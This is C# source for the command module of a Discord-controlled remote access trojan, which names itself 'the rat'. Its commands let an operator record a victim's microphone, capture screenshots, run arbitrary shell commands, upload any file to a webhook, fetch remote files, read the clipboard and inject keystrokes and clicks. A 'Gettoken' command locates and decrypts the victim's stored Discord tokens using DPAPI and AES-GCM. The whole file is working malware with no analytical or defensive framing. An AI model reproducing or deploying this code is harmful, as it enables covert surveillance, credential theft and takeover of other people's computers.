using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.CommandsNext;
using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DSharpPlus.Interactivity.Extensions;
using System.Threading;
using DSharpPlus.Entities;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using Salaros.Configuration;
using AudioSwitcher.AudioApi.CoreAudio;

namespace Discord_Main
{
    public class Fun : BaseCommandModule
    {


        private string appConfig = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\appConfig33.cfg";

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern int myfunc(string a, string b, int c, int d);

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int
        dy, int cButtons, int dwExtraInfo);

        public const int LMBDown = 0x02;
        public const int LMBUp = 0x04;

        [Command("Commandlist"), Description("Shows all commands and what they do.")]
        public async Task Commandlist(CommandContext ctx)
        {
            await ctx.Channel.SendMessageAsync(
                "```" +
                "!Commandlist = shows this menu.\n" +
                "!Record(Sec) = Record computer with given seconds.\n" +
                "!Screenshot = Take a screenshot.\n" +
                "!Msgbox(Text, Title) = Make a msgbox.\n" +
                "!Mbss(Text, Title) = Make a msgbox and screenshot.\n" +
                "!Shell(Command) = Run shell.\n" +
                "!Dir = Get current directory.\n" +
                "!Cd(Path) = Set current directory.\n" +
                "!Cdd(Path) = Set current directory and get current directory.\n" +
                "!Openexe(Path) = Run a exe file.\n" +
                "!Download(Path) = Download a file from computer.\n" +
                "!Gettoken = Get discord token.\n" +
                "!Mousepos(x position, y position) = Set mouse position.\n" +
                "!Download_from_url(url, filename) = Downloads a file from url to computer.\n" +
                "!Set_Group(channel) Sets the group of the computer.Max groups are 1.\n" +
                "!Remove_Group Remove group from computer.\n" +
                "!Get_Group Gets the group this computer is in.\n" +
                "!PingIp(ip, data) Ping a url/server/ip.\n" +
                "!Website(url) Open Website.\n" +
                "!Clipboard Get clipboard.\n" +
                "!Set_Clipboard(Text) Set clipboard.\n" +
                "!Click click\n" +
                "!Write(Text) write words.\n" +
                "!Volume(number) Set volume.\n" +
                "!Mute Muted device.\n" +
                "!Unmute Unmute device.\n" +
                "!Exit = Close the rat.\n" +
                "```"
                );

        }

        [Command("Record"), Description("Record computer with given seconds.")]
        public async Task RecordAudio(CommandContext ctx, int time)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Recording... Wait " + time.ToString() + "sec");

            Console.WriteLine("Recording");
            myfunc("open new type waveaudio Alias recsound", "", 0, 0);
            myfunc("record recsound", "", 0, 0);

            Thread.Sleep(time * 1000);

            ctx.Channel.SendMessageAsync("Done recording");

            Console.WriteLine("Done");
            myfunc("save recsound " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\audi_33.wav", "", 0, 0);
            myfunc("close recsound", "", 0, 0);


            var fileRoute = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\audi_33.wav";
            var wb = Global_Basic.Webhook;
            SendFile(wb, fileRoute);


        }

        [Command("Screenshot"), Description("Takes a screenshot.")]
        public async Task ScreenShot(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Sending image");
            Bitmap bm = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bm);
            g.CopyFromScreen(0, 0, 0, 0, bm.Size);
            bm.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\screen_33.png");
            SendFile(Global_Basic.Webhook, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\screen_33.png");
        }

        [Command("msgbox"), Description("Makes a msgbox.")]
        public async Task MsgBox(CommandContext ctx, string text, string title)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Showing Msg Box");
            MessageBox.Show(text, title);
            //        using (Process process = new Process())
            //      {
            //          process.StartInfo.UseShellExecute = false;
            //          process.StartInfo.FileName = "cmd.exe";
            //          process.StartInfo.CreateNoWindow = true;
            //          process.Start()
            //      }
            //      MessageBox.Show(text);

        }

        [Command("mbss"), Description("Makes a msgbox and takes a screenshot")]
        public async Task mbss(CommandContext ctx, string text, string title)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Showing Msg Box");
            MessageBoxOptions messageBoxOptions = MessageBoxOptions.ServiceNotification;
            MessageBox.Show(text, title);

            Bitmap bm = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bm);
            g.CopyFromScreen(0, 0, 0, 0, bm.Size);
            bm.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\screen_33.png");
            SendFile(Global_Basic.Webhook, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\screen_33.png");
        }

        [Command("Shell"), Description("Runs command in cmd and returns the info.")]
        public async Task Shell(CommandContext ctx, string command)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Shelling");
            Process process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C " + command;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string data = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            ctx.Channel.SendMessageAsync("```" + data + "```");

        }

        [Command("Dir"), Description("Gets current directory.")]
        public async Task Dir(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            string data = String.Join(Environment.NewLine, Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
            if (data.Length >= 1990)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Dir_33.txt", data);
                SendFile(Global_Basic.Webhook, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Dir_33.txt");
            }
            else
            {
                ctx.Channel.SendMessageAsync("```" + data + "```");
            }
        }
        [Command("Cd"), Description("Sets current directory.")]
        public async Task Cd(CommandContext ctx, string path)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            Directory.SetCurrentDirectory(path);
            ctx.Channel.SendMessageAsync("Current Dir: " + Directory.GetCurrentDirectory());
        }

        [Command("Cdd"), Description("Sets current directory and gets current directory.")]
        public async Task Cdd(CommandContext ctx, string path)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            Directory.SetCurrentDirectory(path);
            ctx.Channel.SendMessageAsync("Current Dir: " + Directory.GetCurrentDirectory());

            string data = String.Join(Environment.NewLine, Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
            if (data.Length >= 1990)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Dir_33.txt", data);
                SendFile(Global_Basic.Webhook, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Dir_33.txt");
            }
            else
            {
                ctx.Channel.SendMessageAsync("```" + data + "```");
            }
        }

        [Command("Download"), Description("Downloads a file from computer.")]
        public async Task Download(CommandContext ctx, string path)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            var pp = path.Replace("$", " ");
            SendFile(Global_Basic.Webhook, pp);
        }

        [Command("Openexe"), Description("Runs a exe file.")]
        public async Task openexe(CommandContext ctx, string path)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            var pp = path.Replace("$", " ");
            ctx.Channel.SendMessageAsync("Opening");
            Process process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = pp;
            //        if (Hidden == "yes")
            //        {
            process.StartInfo.CreateNoWindow = true;
            //        }
            //        if (Hidden == "no")
            //       {
            //            process.StartInfo.CreateNoWindow = false;
            //        }
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
        }
        [Command("Exit"), Description("Closes the rat.")]
        public async Task Exit(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            var result = await Reactionchoice(ctx, "Are you sure?", "green_circle", "red_circle");
            if (result)
            {
                ctx.Channel.SendMessageAsync("``" + "True" + "``");
                await ctx.Channel.SendMessageAsync("Exiting");
                Thread.Sleep(100);
                System.Environment.Exit(1);
            }
            else
            {
                ctx.Channel.SendMessageAsync("``" + "False" + "``");
                ctx.Channel.SendMessageAsync("Not exiting");
            }
        }

        [Command("Mousepos"), Description("Sets mouse position.")]
        public async Task Mousepos(CommandContext ctx, int x, int y)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            Cursor.Position = new Point(x, y);
        }

        [Command("Download_from_url"), Description("Downloads a file from url to currect dir.")]
        public async Task Download_from_url(CommandContext ctx, string url, string filename)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            WebClient webClient = new WebClient();
            webClient.DownloadFile(url, filename);
        }

        [Command("Set_Group"), Description("Sets the group of the computer. Max groups are 1.")]
        public async Task Add_Group(CommandContext ctx, ulong group)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Adding Group " + ctx.Guild.GetChannel(group).Name + " to " + System.Windows.Forms.SystemInformation.UserName + ".");
            //        Settings.Default["Group"] = group;
            var cfg = new ConfigParser(appConfig);
            Global_Basic.Group = group;
            cfg.SetValue("CONFIG", "Group", Global_Basic.Group.ToString());
            cfg.Save();
        }

        [Command("Remove_Group"), Description("Remove group from computer.")]
        public async Task Remove_Group(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            var cfg = new ConfigParser(appConfig);
            Global_Basic.Group = 0;
            cfg.SetValue("CONFIG", "Group", Global_Basic.Group.ToString());
            cfg.Save();
            ctx.Channel.SendMessageAsync("Removing Group from " + System.Windows.Forms.SystemInformation.UserName + ".");
            //     ulong n = 0;
            //      Settings.Default["Group"] = n;
        }

        [Command("Get_Group"), Description("Gets the group this computer is in.")]
        public async Task Get_Group(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync(Global_Basic.Group.ToString());
        }

        [Command("PingIp"), Description("Ping a url/server/ip.")]
        public async Task Pingip(CommandContext ctx, string ipaddress, string data)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            IPAddress ip = IPAddress.Parse(ipaddress);
            UdpClient client = new UdpClient();
            try
            {
                client.Connect(ip, 80);
                byte[] sendbytes = Encoding.ASCII.GetBytes(data);
                client.Send(sendbytes, sendbytes.Length);
                client.AllowNatTraversal(true);
                client.DontFragment = true;
                ctx.Channel.SendMessageAsync("Ping sent");
            }
            catch
            {
                ctx.Channel.SendMessageAsync("Something Went Wrong");
            }
        }
        [Command("Website"), Description("Open Website.")]
        public async Task Website(CommandContext ctx, string url)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            Process.Start("explorer", url);
        }
        [Command("Clipboard"), Description("Get clipboard.")]
        public async Task clipboard(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            string data = null;
            Exception threadEx = null;
            Thread staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        data = Clipboard.GetText();
                    }

                    catch (Exception ex)
                    {
                        threadEx = ex;
                    }
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
            ctx.Channel.SendMessageAsync(data);
        }
        [Command("Set_Clipboard"), Description("Set clipboard.")]
        public async Task Set_clipboard(CommandContext ctx, string text)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            Exception threadEx = null;
            Thread staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        Clipboard.SetText(text);
                    }

                    catch (Exception ex)
                    {
                        threadEx = ex;
                    }
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
            ctx.Channel.SendMessageAsync("Setting clipboard.");
        }
        [Command("Click"), Description("Click.")]
        public async Task Click(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            mouse_event(LMBDown, 128, 256, 0, 0);
            mouse_event(LMBUp, 128, 256, 0, 0);
            ctx.Channel.SendMessageAsync("Clicked.");
        }

        [Command("Write"), Description("Write words.")]
        public async Task Write(CommandContext ctx, string text)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            SendKeys.SendWait(text);
            ctx.Channel.SendMessageAsync("Typed keys.");
        }

        [Command("Volume"), Description("Set volume.")]
        public async Task Volume(CommandContext ctx, int volume)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Volume = volume;
            ctx.Channel.SendMessageAsync("Set volume.");
        }

        [Command("Mute"), Description("Mute Device.")]
        public async Task Mute(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Mute(true);
            ctx.Channel.SendMessageAsync("Muted");
        }
        [Command("Unmute"), Description("Unmute Device.")]
        public async Task Unmute(CommandContext ctx)
        {
            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;

            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Mute(false);    
            ctx.Channel.SendMessageAsync("Unmuted.");
        }

        [Command("Gettoken"), Description("Gets discord token.")]
        public async Task Gettoken(CommandContext ctx)
        {

            if (channelcheck(ctx.Channel.Id.ToString()) == false)
                return;
            ctx.Channel.SendMessageAsync("Getting");
            string Tokens = "";
            string RealTokens = "";

            Regex BasicRegex = new(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new(file);
                string contents = File.ReadAllText(info.FullName);

                Match match1 = BasicRegex.Match(contents);
                if (match1.Success) Tokens += match1.Value + "\n";

                Match match2 = NewRegex.Match(contents);
                if (match2.Success) Tokens += match2.Value + "\n";

                Match match3 = EncryptedRegex.Match(contents);
                if (match3.Success)
                {
                    string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                    Tokens += token + "\n";
                    RealTokens = token;
                }
            }

            ctx.Channel.SendMessageAsync(RealTokens);
        }


        public void SendFile(string url, string filepath)
        {
            HttpClient httpsclient = new HttpClient();
            MultipartFormDataContent Content = new MultipartFormDataContent();
            var file = File.ReadAllBytes(filepath);
            Content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filepath), filepath);
            httpsclient.PostAsync(url, Content).Wait();
            httpsclient.Dispose();
        }

        public bool channelcheck(string chl)
        {
            if (chl == Global_Basic.Made_Channel.ToString())
            {
                return true;
            }
            if (chl == Global_Basic.Group.ToString())
            {
                return true;
            }
            return false;
        }
        public async Task<bool> Reactionchoice(CommandContext ctx, string text, string emoji1, string emoji2)
        {
            var msg = await ctx.RespondAsync(text);
            var emoji_1 = DiscordEmoji.FromName(ctx.Client, ":" + emoji1 + ":");
            var emoji_2 = DiscordEmoji.FromName(ctx.Client, ":" + emoji2 + ":");

            await msg.CreateReactionAsync(emoji_1).ConfigureAwait(false);
            await msg.CreateReactionAsync(emoji_2).ConfigureAwait(false);
            var interactivity = ctx.Client.GetInteractivity();

            var Result = await interactivity.WaitForReactionAsync(x => x.Message == msg && x.User == ctx.User && (x.Emoji == emoji_1 || x.Emoji == emoji_2)).ConfigureAwait(false);

            if (Result.Result.Emoji == emoji_1)
            {
                ctx.Channel.DeleteMessageAsync(msg).ConfigureAwait(false);
                return true;
                //  await ctx.Guild.CreateChannelAsync("skull", DSharpPlus.ChannelType.Text);
            }
            else if (Result.Result.Emoji == emoji_2)
            {
                ctx.Channel.DeleteMessageAsync(msg).ConfigureAwait(false);
                return false;
            }
            else { return false; }
        }

        private static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        private static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new(new Org.BouncyCastle.Crypto.Parameters.KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

    }
}
